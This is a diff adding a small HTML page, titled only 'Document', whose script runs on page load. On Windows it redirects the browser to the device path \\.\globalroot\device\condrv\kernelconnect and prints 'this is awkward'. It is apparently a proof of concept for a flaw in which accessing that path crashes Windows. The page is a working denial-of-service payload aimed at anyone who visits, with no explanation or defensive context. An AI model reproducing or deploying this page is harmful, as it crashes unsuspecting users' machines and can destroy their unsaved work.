@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        setTimeout(()=>{
+            let b =document.querySelector('body')
+            if (window.navigator.platform.toLowerCase().includes('win'))
+            {
+                window.location='\\\\.\\globalroot\\device\\condrv\\kernelconnect'
+                b.append('this is awkward')
+            }else{
+                b.append('Not on windows?')
+            }
+        },1000);
+    </script>
+</body>
+</html>
